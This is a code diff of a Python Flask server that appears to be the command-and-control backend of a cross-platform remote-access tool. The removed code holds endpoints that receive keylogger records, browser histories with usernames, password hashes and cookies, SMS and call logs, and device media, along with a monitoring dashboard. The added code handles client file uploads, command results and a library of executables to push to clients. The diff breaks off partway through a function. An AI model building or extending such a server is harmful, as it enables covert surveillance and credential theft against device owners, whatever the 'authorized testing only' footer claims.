+        if result:
+            # Notify via WebSocket
+            socketio.emit('command_result', {
+                'command_id': command_id,
+                'client_id': result['client_id'],
+                'status': status,
+                'timestamp': time.time()
+            })
         
-        return jsonify({'success': True}), 200
+        logger.info(f"[✓] Command result: {command_id[:8]} - {status}")
+        
+        return jsonify({'success': True})
         
     except Exception as e:
-        logger.error(f"Submit result error: {e}")
+        logger.error(f"[✗] Submit result error: {e}")
         return jsonify({'error': str(e)}), 500
 
-@app.route('/api/v1/command/result/<command_id>', methods=['GET'])
-def get_command_result(command_id):
-    """Get command result"""
-    try:
-        conn = get_db()
-        cursor = conn.cursor()
-        
-        cursor.execute('''
-            SELECT c.*, d.device_name, d.platform 
-            FROM commands c
-            LEFT JOIN devices d ON c.device_id = d.device_id
-            WHERE c.command_id = ?
-        ''', (command_id,))
-        
-        row = cursor.fetchone()
-        conn.close()
-        
-        if row:
-            return jsonify({
-                'success': True,
-                'command_id': row['command_id'],
-                'device_id': row['device_id'],
-                'device_name': row['device_name'],
-                'platform': row['platform'],
-                'command_type': row['command_type'],
-                'command_text': row['command_text'],
-                'status': row['status'],
-                'result': row['result'] or '',
-                'created_at': row['created_at'],
-                'executed_at': row['executed_at']
-            }), 200
-        else:
-            return jsonify({
-                'success': False,
-                'error': 'Command not found'
-            }), 404
-            
-    except Exception as e:
-        logger.error(f"Get result error: {e}")
-        return jsonify({'error': str(e)}), 500
-
-# ============================================================================
-# MEDIA & FILE MANAGEMENT
-# ============================================================================
-
-@app.route('/api/v1/media/upload', methods=['POST'])
-def upload_media():
-    """Upload media/file from device"""
+@app.route('/api/upload', methods=['POST'])
+def upload_file():
+    """Upload file from client"""
     try:
         if 'file' not in request.files:
             return jsonify({'error': 'No file provided'}), 400
         
         file = request.files['file']
-        device_id = request.form.get('device_id')
-        file_type = request.form.get('file_type', 'unknown')
-        metadata = request.form.get('metadata', '{}')
+        client_id = request.form.get('client_id')
+        file_type = request.form.get('type', 'unknown')
         
-        if not device_id:
-            return jsonify({'error': 'Missing device_id'}), 400
+        if not client_id:
+            return jsonify({'error': 'No client ID'}), 400
         
-        # Validate device exists
+        if file.filename == '':
+            return jsonify({'error': 'No filename'}), 400
+        
         conn = get_db()
-        cursor = conn.cursor()
-        cursor.execute('SELECT device_name FROM devices WHERE device_id = ?', (device_id,))
-        device = cursor.fetchone()
+        c = conn.cursor()
         
-        if not device:
+        # Get client info
+        c.execute('SELECT hostname, download_folder FROM clients WHERE id = ?', (client_id,))
+        client = c.fetchone()
+        
+        if not client:
             conn.close()
-            return jsonify({'error': 'Device not found'}), 404
+            return jsonify({'error': 'Client not found'}), 404
         
-        device_name = device['device_name']
-        conn.close()
-        
-        # Determine file category based on type or extension
+        # Determine file type and folder
         filename = file.filename.lower()
-        
-        if file_type == 'screenshot' or 'screenshot' in filename:
-            category = 'screenshots'
-            mime_type = 'image'
-        elif file_type == 'photo' or any(filename.endswith(ext) for ext in ['.jpg', '.jpeg', '.png', '.gif', '.bmp']):
-            category = 'photos'
-            mime_type = 'image'
-        elif file_type == 'video' or any(filename.endswith(ext) for ext in ['.mp4', '.avi', '.mov', '.mkv', '.webm']):
-            category = 'videos'
-            mime_type = 'video'
-        elif file_type == 'audio' or any(filename.endswith(ext) for ext in ['.mp3', '.wav', '.m4a', '.ogg']):
-            category = 'audio'
-            mime_type = 'audio'
-        elif file_type == 'document' or any(filename.endswith(ext) for ext in ['.pdf', '.doc', '.docx', '.xls', '.xlsx', '.txt', '.log']):
-            category = 'documents'
-            mime_type = 'document'
+        if any(filename.endswith(ext) for ext in ['.exe', '.msi', '.bat', '.ps1', '.vbs']):
+            file_type = 'executable'
+            folder = EXECUTABLES_FOLDER
+        elif any(filename.endswith(ext) for ext in ['.jpg', '.jpeg', '.png', '.gif', '.bmp']):
+            file_type = 'image'
+            folder = SCREENSHOTS_FOLDER
+        elif any(filename.endswith(ext) for ext in ['.txt', '.log', '.cfg', '.ini']):
+            file_type = 'document'
+            folder = os.path.join(DOWNLOAD_FOLDER, client['hostname'], 'documents')
         else:
-            category = 'other'
-            mime_type = mimetypes.guess_type(filename)[0] or 'application/octet-stream'
+            file_type = 'other'
+            folder = os.path.join(DOWNLOAD_FOLDER, client['hostname'], 'other')
         
-        # Create organized folder structure
-        device_folder = os.path.join(MEDIA_FOLDER, device_id[:8])
-        category_folder = os.path.join(device_folder, category)
-        os.makedirs(category_folder, exist_ok=True)
-        
-        # Generate unique filename
-        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-        unique_filename = f"{timestamp}_{file.filename.replace(' ', '_')}"
-        filepath = os.path.join(category_folder, unique_filename)
+        os.makedirs(folder, exist_ok=True)
         
         # Save file
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        safe_filename = f"{timestamp}_{file.filename}"
+        filepath = os.path.join(folder, safe_filename)
+        
         file.save(filepath)
         filesize = os.path.getsize(filepath)
         
-        # Create thumbnail for images (optional)
-        thumbnail_path = None
-        if mime_type.startswith('image'):
-            try:
-                from PIL import Image
-                img = Image.open(filepath)
-                img.thumbnail((200, 200))
-                thumbnail_path = filepath.replace('.', '_thumb.')
-                img.save(thumbnail_path)
-            except:
-                thumbnail_path = None
+        # Calculate hashes
+        with open(filepath, 'rb') as f:
+            file_data = f.read()
+            hash_md5 = hashlib.md5(file_data).hexdigest()
+            hash_sha256 = hashlib.sha256(file_data).hexdigest()
         
-        # Save to database
-        media_id = str(uuid.uuid4())
-        
-        conn = get_db()
-        cursor = conn.cursor()
-        
-        cursor.execute('''
-            INSERT INTO media 
-            (media_id, device_id, file_type, file_path, file_name, 
-             file_size, mime_type, thumbnail_path, created_at, metadata)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-        ''', (
-            media_id, device_id, file_type, filepath, file.filename,
-            filesize, mime_type, thumbnail_path, time.time(), metadata
-        ))
+        # Store in database
+        file_id = str(uuid.uuid4())
+        c.execute("""INSERT INTO files 
+                    (id, client_id, filename, original_name, filepath, 
+                     filetype, filesize, uploaded_at, hash_md5, hash_sha256)
+                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
+                 (file_id, client_id, safe_filename, file.filename,
+                  filepath, file_type, filesize, time.time(),
+                  hash_md5, hash_sha256))
         
         conn.commit()
         conn.close()
         
-        logger.info(f"Media uploaded: {file.filename} ({filesize} bytes) from {device_id[:8]}")
+        logger.info(f"[✓] File uploaded: {file.filename} ({filesize} bytes) from {client['hostname']}")
         
         return jsonify({
             'success': True,
-            'media_id': media_id,
+            'file_id': file_id,
             'filename': file.filename,
-            'file_type': file_type,
             'size': filesize,
-            'category': category,
-            'thumbnail': thumbnail_path is not None
-        }), 200
+            'hash_sha256': hash_sha256
+        })
         
     except Exception as e:
-        logger.error(f"Media upload error: {e}")
+        logger.error(f"[✗] Upload error: {e}")
         return jsonify({'error': str(e)}), 500
 
-@app.route('/api/v1/media/list/<device_id>', methods=['GET'])
-def list_media(device_id):
-    """List media/files for device"""
+@app.route('/api/files/<client_id>', methods=['GET'])
+def list_client_files(client_id):
+    """List files from a client"""
     try:
-        file_type = request.args.get('type')
-        limit = int(request.args.get('limit', 50))
-        
         conn = get_db()
-        cursor = conn.cursor()
+        c = conn.cursor()
         
-        query = '''
-            SELECT media_id, file_type, file_name, file_size, 
-                   mime_type, thumbnail_path, created_at, metadata
-            FROM media 
-            WHERE device_id = ?
-        '''
-        params = [device_id]
+        c.execute("""SELECT id, original_name, filetype, filesize, 
+                    uploaded_at, downloaded, hash_sha256
+                    FROM files 
+                    WHERE client_id = ?
+                    ORDER BY uploaded_at DESC""", (client_id,))
         
-        if file_type:
-            query += ' AND file_type = ?'
-            params.append(file_type)
-        
-        query += ' ORDER BY created_at DESC LIMIT ?'
-        params.append(limit)
-        
-        cursor.execute(query, params)
-        
-        media_list = []
-        for row in cursor.fetchall():
-            media_list.append({
-                'media_id': row['media_id'],
-                'file_type': row['file_type'],
-                'filename': row['file_name'],
-                'size': row['file_size'],
-                'size_str': f"{row['file_size'] / 1024 / 1024:.2f} MB" if row['file_size'] > 1024*1024 else f"{row['file_size'] / 1024:.1f} KB",
-                'mime_type': row['mime_type'],
-                'has_thumbnail': row['thumbnail_path'] is not None,
-                'created_at': row['created_at'],
-                'time_str': datetime.fromtimestamp(row['created_at']).strftime('%H:%M:%S'),
-                'date_str': datetime.fromtimestamp(row['created_at']).strftime('%Y-%m-%d'),
-                'metadata': json.loads(row['metadata']) if row['metadata'] else {}
+        files = []
+        for row in c.fetchall():
+            files.append({
+                'id': row['id'],
+                'filename': row['original_name'],
+                'type': row['filetype'],
+                'size': row['filesize'],
+                'size_str': format_size(row['filesize']),
+                'uploaded': datetime.fromtimestamp(row['uploaded_at']).strftime('%Y-%m-%d %H:%M'),
+                'downloaded': bool(row['downloaded']),
+                'hash': row['hash_sha256'][:16] + '...'
             })
         
         conn.close()
-        
-        return jsonify({
-            'media': media_list,
-            'total': len(media_list),
-            'device_id': device_id
-        }), 200
+        return jsonify({'files': files})
         
     except Exception as e:
-        logger.error(f"List media error: {e}")
-        return jsonify({'media': [], 'error': str(e)}), 500
+        logger.error(f"[✗] List files error: {e}")
+        return jsonify({'files': []})
 
-@app.route('/api/v1/media/download/<media_id>', methods=['GET'])
-def download_media(media_id):
-    """Download media/file"""
+@app.route('/api/file/download/<file_id>', methods=['GET'])
+def download_file(file_id):
+    """Download a file"""
     try:
         conn = get_db()
-        cursor = conn.cursor()
+        c = conn.cursor()
         
-        cursor.execute('SELECT file_path, file_name, mime_type FROM media WHERE media_id = ?', (media_id,))
-        row = cursor.fetchone()
+        c.execute("SELECT filepath, original_name FROM files WHERE id = ?", (file_id,))
+        file_info = c.fetchone()
         
-        if not row or not os.path.exists(row['file_path']):
+        if not file_info or not os.path.exists(file_info['filepath']):
             conn.close()
             return jsonify({'error': 'File not found'}), 404
         
-        file_path = row['file_path']
-        filename = row['file_name']
-        mime_type = row['mime_type'] or 'application/octet-stream'
-        
-        conn.close()
-        
-        # Stream the file
-        def generate():
-            with open(file_path, 'rb') as f:
-                while chunk := f.read(8192):
-                    yield chunk
-        
-        response = Response(generate(), mimetype=mime_type)
-        response.headers['Content-Disposition'] = f'attachment; filename="{filename}"'
-        response.headers['Content-Length'] = os.path.getsize(file_path)
-        
-        return response
-        
-    except Exception as e:
-        logger.error(f"Download error: {e}")
-        return jsonify({'error': str(e)}), 500
-
-@app.route('/api/v1/media/preview/<media_id>', methods=['GET'])
-def preview_media(media_id):
-    """Preview media (images/videos)"""
-    try:
-        conn = get_db()
-        cursor = conn.cursor()
-        
-        cursor.execute('SELECT file_path, mime_type, thumbnail_path FROM media WHERE media_id = ?', (media_id,))
-        row = cursor.fetchone()
-        conn.close()
-        
-        if not row or not os.path.exists(row['file_path']):
-            return jsonify({'error': 'File not found'}), 404
-        
-        # Use thumbnail if available for images
-        file_path = row['thumbnail_path'] or row['file_path']
-        mime_type = row['mime_type'] or 'application/octet-stream'
-        
-        if not os.path.exists(file_path):
-            file_path = row['file_path']
-        
-        return send_file(file_path, mimetype=mime_type)
-        
-    except Exception as e:
-        logger.error(f"Preview error: {e}")
-        return jsonify({'error': str(e)}), 500
-
-# ============================================================================
-# SMS & COMMUNICATIONS
-# ============================================================================
-
-@app.route('/api/v1/communications/upload', methods=['POST'])
-def upload_communications():
-    """Upload SMS/call logs"""
-    try:
-        data = request.json
-        device_id = data.get('device_id')
-        communications = data.get('communications', [])
-        
-        if not device_id or not communications:
-            return jsonify({'error': 'Missing device_id or communications'}), 400
-        
-        conn = get_db()
-        cursor = conn.cursor()
-        
-        inserted = 0
-        for comm in communications:
-            comm_id = str(uuid.uuid4())
-            
-            cursor.execute('''
-                INSERT INTO communications 
-                (comm_id, device_id, type, phone_number, contact_name, 
-                 content, timestamp, direction, duration, read_status)
-                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-            ''', (
-                comm_id,
-                device_id,
-                comm.get('type', 'sms'),
-                comm.get('phone_number', ''),
-                comm.get('contact_name', ''),
-                comm.get('content', ''),
-                comm.get('timestamp', time.time()),
-                comm.get('direction', 'unknown'),
-                comm.get('duration', 0),
-                comm.get('read_status', 0)
-            ))
-            
-            inserted += 1
-        
+        # Mark as downloaded
+        c.execute("UPDATE files SET downloaded = 1 WHERE id = ?", (file_id,))
         conn.commit()
         conn.close()
         
-        logger.info(f"Communications uploaded: {inserted} records from {device_id[:8]}")
-        
-        return jsonify({
-            'success': True,
-            'inserted': inserted,
-            'message': f'{inserted} communications uploaded'
-        }), 200
+        return send_file(
+            file_info['filepath'],
+            as_attachment=True,
+            download_name=file_info['original_name']
+        )
         
     except Exception as e:
-        logger.error(f"Communications upload error: {e}")
+        logger.error(f"[✗] Download error: {e}")
         return jsonify({'error': str(e)}), 500
 
-@app.route('/api/v1/communications/<device_id>', methods=['GET'])
-def get_communications(device_id):
-    """Get communications for device"""
-    try:
-        comm_type = request.args.get('type')
-        limit = int(request.args.get('limit', 100))
-        
-        conn = get_db()
-        cursor = conn.cursor()
-        
-        query = '''
-            SELECT comm_id, type, phone_number, contact_name, content,
-                   timestamp, direction, duration, read_status
-            FROM communications 
-            WHERE device_id = ?
-        '''
-        params = [device_id]
-        
-        if comm_type:
-            query += ' AND type = ?'
-            params.append(comm_type)
-        
-        query += ' ORDER BY timestamp DESC LIMIT ?'
-        params.append(limit)
-        
-        cursor.execute(query, params)
-        
-        communications = []
-        for row in cursor.fetchall():
-            communications.append({
-                'id': row['comm_id'],
-                'type': row['type'],
-                'phone_number': row['phone_number'],
-                'contact_name': row['contact_name'],
-                'content': row['content'],
-                'timestamp': row['timestamp'],
-                'time_str': datetime.fromtimestamp(row['timestamp']).strftime('%H:%M:%S'),
-                'date_str': datetime.fromtimestamp(row['timestamp']).strftime('%Y-%m-%d'),
-                'direction': row['direction'],
-                'duration': row['duration'],
-                'read_status': bool(row['read_status'])
-            })
-        
-        conn.close()
-        
-        return jsonify({
-            'communications': communications,
-            'total': len(communications),
-            'device_id': device_id
-        }), 200
-        
-    except Exception as e:
-        logger.error(f"Get communications error: {e}")
-        return jsonify({'communications': [], 'error': str(e)}), 500
-
-# ============================================================================
-# BROWSER DATA
-# ============================================================================
-
-@app.route('/api/v1/browser/upload', methods=['POST'])
-def upload_browser_data():
-    """Upload browser data (history, passwords, cookies)"""
-    try:
-        data = request.json
-        device_id = data.get('device_id')
-        browser_data = data.get('browser_data', [])
-        
-        if not device_id or not browser_data:
-            return jsonify({'error': 'Missing device_id or browser_data'}), 400
-        
-        conn = get_db()
-        cursor = conn.cursor()
-        
-        inserted = 0
-        for browser in browser_data:
-            browser_id = str(uuid.uuid4())
-            
-            cursor.execute('''
-                INSERT INTO browser_data 
-                (browser_id, device_id, browser_name, url, title,
-                 visit_count, last_visit, username, password_hash,
-                 cookie_data, bookmark, download_history)
-                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-            ''', (
-                browser_id,
-                device_id,
-                browser.get('browser_name', 'unknown'),
-                browser.get('url', ''),
-                browser.get('title', ''),
-                browser.get('visit_count', 0),
-                browser.get('last_visit', time.time()),
-                browser.get('username', ''),
-                browser.get('password_hash', ''),
-                json.dumps(browser.get('cookies', [])),
-                browser.get('bookmark', ''),
-                json.dumps(browser.get('download_history', []))
-            ))
-            
-            inserted += 1
-        
-        conn.commit()
-        conn.close()
-        
-        logger.info(f"Browser data uploaded: {inserted} records from {device_id[:8]}")
-        
-        return jsonify({
-            'success': True,
-            'inserted': inserted,
-            'message': f'{inserted} browser records uploaded'
-        }), 200
-        
-    except Exception as e:
-        logger.error(f"Browser upload error: {e}")
-        return jsonify({'error': str(e)}), 500
-
-# ============================================================================
-# KEYLOGS
-# ============================================================================
-
-@app.route('/api/v1/keylogs/upload', methods=['POST'])
-def upload_keylogs():
-    """Upload keylogger data"""
-    try:
-        data = request.json
-        device_id = data.get('device_id')
-        keylogs = data.get('keylogs', [])
-        
-        if not device_id or not keylogs:
-            return jsonify({'error': 'Missing device_id or keylogs'}), 400
-        
-        conn = get_db()
-        cursor = conn.cursor()
-        
-        inserted = 0
-        for log in keylogs:
-            keylog_id = str(uuid.uuid4())
-            
-            cursor.execute('''
-                INSERT INTO keylogs 
-                (keylog_id, device_id, application, window_title,
-                 keystrokes, timestamp, screenshot_path)
-                VALUES (?, ?, ?, ?, ?, ?, ?)
-            ''', (
-                keylog_id,
-                device_id,
-                log.get('application', 'unknown'),
-                log.get('window_title', ''),
-                log.get('keystrokes', ''),
-                log.get('timestamp', time.time()),
-                log.get('screenshot_path', '')
-            ))
-            
-            inserted += 1
-        
-        conn.commit()
-        conn.close()
-        
-        logger.info(f"Keylogs uploaded: {inserted} records from {device_id[:8]}")
-        
-        return jsonify({
-            'success': True,
-            'inserted': inserted,
-            'message': f'{inserted} keylog records uploaded'
-        }), 200
-        
-    except Exception as e:
-        logger.error(f"Keylogs upload error: {e}")
-        return jsonify({'error': str(e)}), 500
-
-# ============================================================================
-# STATISTICS & MONITORING
-# ============================================================================
-
-@app.route('/api/v1/stats', methods=['GET'])
-def get_stats():
-    """Get server statistics"""
-    try:
-        conn = get_db()
-        cursor = conn.cursor()
-        
-        current_time = time.time()
-        
-        # Count devices
-        cursor.execute('SELECT COUNT(*) FROM devices')
-        total_devices = cursor.fetchone()[0]
-        
-        cursor.execute('SELECT COUNT(*) FROM devices WHERE ? - last_seen <= 60', (current_time,))
-        online_devices = cursor.fetchone()[0]
-        
-        # Count by platform
-        cursor.execute('SELECT platform, COUNT(*) as count FROM devices GROUP BY platform')
-        platforms = {}
-        for row in cursor.fetchall():
-            platforms[row['platform']] = row['count']
-        
-        # Count media
-        cursor.execute('SELECT COUNT(*) FROM media')
-        total_media = cursor.fetchone()[0]
-        
-        cursor.execute('SELECT file_type, COUNT(*) as count FROM media GROUP BY file_type')
-        media_by_type = {}
-        for row in cursor.fetchall():
-            media_by_type[row['file_type']] = row['count']
-        
-        # Count communications
-        cursor.execute('SELECT COUNT(*) FROM communications')
-        total_communications = cursor.fetchone()[0]
-        
-        cursor.execute('SELECT type, COUNT(*) as count FROM communications GROUP BY type')
-        comms_by_type = {}
-        for row in cursor.fetchall():
-            comms_by_type[row['type']] = row['count']
-        
-        # Count commands
-        cursor.execute('SELECT COUNT(*) FROM commands')
-        total_commands = cursor.fetchone()[0]
-        
-        cursor.execute('SELECT status, COUNT(*) as count FROM commands GROUP BY status')
-        commands_by_status = {}
-        for row in cursor.fetchall():
-            commands_by_status[row['status']] = row['count']
-        
-        conn.close()
-        
-        # Server uptime
-        uptime = current_time - SERVER_START_TIME
-        hours = int(uptime // 3600)
-        minutes = int((uptime % 3600) // 60)
-        
-        # Storage usage
-        total_size = 0
-        for root, dirs, files in os.walk(MEDIA_FOLDER):
-            for file in files:
-                try:
-                    total_size += os.path.getsize(os.path.join(root, file))
-                except:
-                    pass
-        
-        return jsonify({
-            'server': {
-                'version': '2.0',
-                'uptime': f"{hours}h {minutes}m",
-                'start_time': SERVER_START_TIME,
-                'current_time': current_time
-            },
-            'devices': {
-                'total': total_devices,
-                'online': online_devices,
-                'offline': total_devices - online_devices,
-                'by_platform': platforms
-            },
-            'media': {
-                'total': total_media,
-                'by_type': media_by_type,
-                'total_size': total_size,
-                'total_size_str': f"{total_size / 1024 / 1024 / 1024:.2f} GB"
-            },
-            'communications': {
-                'total': total_communications,
-                'by_type': comms_by_type
-            },
-            'commands': {
-                'total': total_commands,
-                'by_status': commands_by_status
-            },
-            'storage': {
-                'media_folder': MEDIA_FOLDER,
-                'screenshots_folder': SCREENSHOTS_FOLDER,
-                'keylogs_folder': KEYLOGS_FOLDER
-            }
-        }), 200
-        
-    except Exception as e:
-        logger.error(f"Get stats error: {e}")
-        return jsonify({'error': str(e)}), 500
-
-@app.route('/api/v1/health', methods=['GET'])
-def health_check():
-    """Health check endpoint"""
-    try:
-        # Check database
-        db_status = 'ok'
+@app.route('/api/executables', methods=['GET', 'POST'])
+def manage_executables():
+    """Manage executables library"""
+    if request.method == 'GET':
+        # List executables
         try:
             conn = get_db()
-            cursor = conn.cursor()
-            cursor.execute('SELECT 1')
+            c = conn.cursor()
+            
+            c.execute("""SELECT id, name, description, filename, platform, 
+                        require_admin, uploader, uploaded_at, downloads, size
+                        FROM executables 
+                        ORDER BY uploaded_at DESC""")
+            
+            executables = []
+            for row in c.fetchall():
+                executables.append({
+                    'id': row['id'],
+                    'name': row['name'],
+                    'description': row['description'],
+                    'filename': row['filename'],
+                    'platform': row['platform'],
+                    'require_admin': bool(row['require_admin']),
+                    'uploader': row['uploader'],
+                    'uploaded': datetime.fromtimestamp(row['uploaded_at']).strftime('%Y-%m-%d'),
+                    'downloads': row['downloads'],
+                    'size': format_size(row['size'])
+                })
+            
             conn.close()
+            return jsonify({'executables': executables})
+            
         except Exception as e:
-            db_status = f'error: {e}'
-        
-        # Check disk space
-        import shutil
-        disk_usage = shutil.disk_usage('.')
-        
-        return jsonify({
-            'status': 'healthy',
-            'timestamp': time.time(),
-            'version': '2.0',
-            'database': db_status,
-            'disk': {
-                'total': disk_usage.total,
-                'free': disk_usage.free,
-                'used': disk_usage.used,
-                'percent': (disk_usage.used / disk_usage.total) * 100
-            },
-            'endpoints': {
-                'devices': '/api/v1/devices',
-                'commands': '/api/v1/command/send',
-                'media': '/api/v1/media/upload',
-                'communications': '/api/v1/communications/upload',
-                'stats': '/api/v1/stats'
-            }
-        }), 200
-        
-    except Exception as e:
-        return jsonify({'status': 'unhealthy', 'error': str(e)}), 500
-
-# ============================================================================
-# WEB INTERFACE
-# ============================================================================
-
-@app.route('/')
-def index():
-    """Web dashboard"""
-    return '''
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Universal Security Dashboard</title>
-        <style>
-            * {
-                margin: 0;
-                padding: 0;
-                box-sizing: border-box;
-            }
-            
-            body {
-                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
-                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-                min-height: 100vh;
-                color: #333;
-            }
-            
-            .container {
-                max-width: 1400px;
-                margin: 0 auto;
-                padding: 20px;
-            }
-            
-            .header {
-                background: rgba(255, 255, 255, 0.1);
-                backdrop-filter: blur(10px);
-                border-radius: 20px;
-                padding: 30px;
-                margin-bottom: 30px;
-                color: white;
-                text-align: center;
-                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
-            }
-            
-            .header h1 {
-                font-size: 2.5em;
-                margin-bottom: 10px;
-                text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
-            }
-            
-            .header p {
-                opacity: 0.9;
-                margin-bottom: 20px;
-            }
-            
-            .stats-grid {
-                display: grid;
-                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-                gap: 20px;
-                margin-bottom: 30px;
-            }
-            
-            .stat-card {
-                background: white;
-                border-radius: 15px;
-                padding: 20px;
-                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-                transition: transform 0.3s;
-            }
-            
-            .stat-card:hover {
-                transform: translateY(-5px);
-            }
-            
-            .stat-card h3 {
-                color: #666;
-                font-size: 0.9em;
-                text-transform: uppercase;
-                letter-spacing: 1px;
-                margin-bottom: 10px;
-            }
-            
-            .stat-number {
-                font-size: 2em;
-                font-weight: bold;
-                color: #667eea;
-                margin-bottom: 5px;
-            }
-            
-            .device-list {
-                background: white;
-                border-radius: 15px;
-                padding: 20px;
-                margin-bottom: 30px;
-                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            }
-            
-            .device-list h2 {
-                margin-bottom: 20px;
-                color: #333;
-                border-bottom: 2px solid #667eea;
-                padding-bottom: 10px;
-            }
-            
-            table {
-                width: 100%;
-                border-collapse: collapse;
-            }
-            
-            th, td {
-                padding: 12px;
-                text-align: left;
-                border-bottom: 1px solid #eee;
-            }
-            
-            th {
-                background: #f8f9fa;
-                font-weight: 600;
-                color: #666;
-            }
-            
-            .status-online {
-                color: #10b981;
-                font-weight: 600;
-            }
-            
-            .status-offline {
-                color: #ef4444;
-                font-weight: 600;
-            }
-            
-            .status-idle {
-                color: #f59e0b;
-                font-weight: 600;
-            }
-            
-            .platform-badge {
-                display: inline-block;
-                padding: 4px 8px;
-                border-radius: 12px;
-                font-size: 0.8em;
-                font-weight: 600;
-                margin-right: 5px;
-            }
-            
-            .android { background: #3ddc84; color: white; }
-            .ios { background: #000; color: white; }
-            .windows { background: #0078d7; color: white; }
-            .linux { background: #fcc624; color: #333; }
-            .macos { background: #999; color: white; }
-            
-            .footer {
-                text-align: center;
-                padding: 20px;
-                color: white;
-                opacity: 0.7;
-                font-size: 0.9em;
-            }
-            
-            .controls {
-                display: grid;
-                grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-                gap: 10px;
-                margin-top: 20px;
-            }
-            
-            .btn {
-                background: #667eea;
-                color: white;
-                border: none;
-                padding: 10px 20px;
-                border-radius: 8px;
-                cursor: pointer;
-                font-weight: 600;
-                transition: background 0.3s;
-            }
-            
-            .btn:hover {
-                background: #5a67d8;
-            }
-            
-            @media (max-width: 768px) {
-                .container {
-                    padding: 10px;
-                }
-                
-                .header {
-                    padding: 20px;
-                }
-                
-                .header h1 {
-                    font-size: 1.8em;
-                }
-                
-                table {
-                    font-size: 0.9em;
-                }
-            }
-        </style>
-    </head>
-    <body>
-        <div class="container">
-            <div class="header">
-                <h1>🔒 Universal Security Dashboard</h1>
-                <p>Cross-Platform Device Management & Monitoring</p>
-                <div class="controls">
-                    <button class="btn" onclick="loadStats()">🔄 Refresh</button>
-                    <button class="btn" onclick="window.open('/api/v1/stats', '_blank')">📊 Stats</button>
-                    <button class="btn" onclick="window.open('/api/v1/health', '_blank')">🩺 Health</button>
-                </div>
-            </div>
-            
-            <div id="stats" class="stats-grid">
-                <!-- Stats loaded dynamically -->
-            </div>
-            
-            <div class="device-list">
-                <h2>📱 Connected Devices</h2>
-                <div id="devices">
-                    <!-- Devices loaded dynamically -->
-                </div>
-            </div>
-            
-            <div class="footer">
-                <p>Universal Security Server v2.0 | For authorized testing only</p>
-                <p>Supports: Android, iOS, Windows, Linux, macOS, Tablets</p>
-            </div>
-        </div>
-        
-        <script>
-            async function loadStats() {
-                try {
-                    // Load statistics
-                    const statsResponse = await fetch('/api/v1/stats');
-                    const statsData = await statsResponse.json();
-                    
-                    // Update stats grid
-                    const statsDiv = document.getElementById('stats');
-                    statsDiv.innerHTML = `
-                        <div class="stat-card">
-                            <h3>Total Devices</h3>
-                            <div class="stat-number">${statsData.devices.total}</div>
-                            <p>${statsData.devices.online} online</p>
-                        </div>
-                        <div class="stat-card">
-                            <h3>Media Files</h3>
-                            <div class="stat-number">${statsData.media.total}</div>
-                            <p>${statsData.media.total_size_str}</p>
-                        </div>
-                        <div class="stat-card">
-                            <h3>Commands Executed</h3>
-                            <div class="stat-number">${statsData.commands.total}</div>
-                            <p>${statsData.commands.by_status?.completed || 0} completed</p>
-                        </div>
-                        <div class="stat-card">
-                            <h3>Communications</h3>
-                            <div class="stat-number">${statsData.communications.total}</div>
-                            <p>SMS & Call logs</p>
-                        </div>
-                    `;
-                    
-                    // Load devices
-                    const devicesResponse = await fetch('/api/v1/devices');
-                    const devicesData = await devicesResponse.json();
-                    
-                    const devicesDiv = document.getElementById('devices');
-                    
-                    if (devicesData.devices.length === 0) {
-                        devicesDiv.innerHTML = '<p>No devices connected</p>';
-                        return;
-                    }
-                    
-                    let tableHTML = `
-                        <table>
-                            <thead>
-                                <tr>
-                                    <th>Device</th>
-                                    <th>Platform</th>
-                                    <th>Status</th>
-                                    <th>Last Seen</th>
-                                    <th>IP Address</th>
-                                    <th>Actions</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                    `;
-                    
-                    devicesData.devices.forEach(device => {
-                        const platformClass = device.platform.toLowerCase();
-                        const statusClass = `status-${device.status}`;
-                        
-                        tableHTML += `
-                            <tr>
-                                <td>
-                                    <strong>${device.device_name}</strong><br>
-                                    <small>${device.model || 'Unknown model'}</small>
-                                </td>
-                                <td>
-                                    <span class="platform-badge ${platformClass}">
-                                        ${device.platform_icon} ${device.platform}
-                                    </span>
-                                </td>
-                                <td class="${statusClass}">
-                                    ${device.status_display}
-                                </td>
-                                <td>${device.last_seen_str}</td>
-                                <td>${device.ip_address || 'Unknown'}</td>
-                                <td>
-                                    <button class="btn" onclick="controlDevice('${device.device_id}')">
-                                        Control
-                                    </button>
-                                </td>
-                            </tr>
-                        `;
-                    });
-                    
-                    tableHTML += '</tbody></table>';
-                    devicesDiv.innerHTML = tableHTML;
-                    
-                } catch (error) {
-                    console.error('Error loading data:', error);
-                    document.getElementById('stats').innerHTML = '<p>Error loading statistics</p>';
-                    document.getElementById('devices').innerHTML = '<p>Error loading devices</p>';
-                }
-            }
-            
-            function controlDevice(deviceId) {
-                alert(`Control device ${deviceId}\nUse console application for full control.`);
-                // In real implementation, open control panel for this device
-            }
-            
-            // Load data on page load
-            loadStats();
-            
-            // Auto-refresh every 30 seconds
-            setInterval(loadStats, 30000);
-        </script>
-    </body>
-    </html>
-    '''
-
-# ============================================================================
-# MAINTENANCE
-# ============================================================================
-
-def cleanup_old_data():
-    """Cleanup old data periodically"""
-    while True:
-        time.sleep(3600)  # Run every hour
+            logger.error(f"[✗] List executables error: {e}")
+            return jsonify({'executables': []})
+    
+    elif request.method == 'POST':
+        # Upload new executable
         try:
+            if 'file' not in request.files:
+                return jsonify({'error': 'No file provided'}), 400
+            
+            file = request.files['file']
+            name = request.form.get('name', file.filename)
+            description = request.form.get('description', '')
+            platform = request.form.get('platform', 'windows')
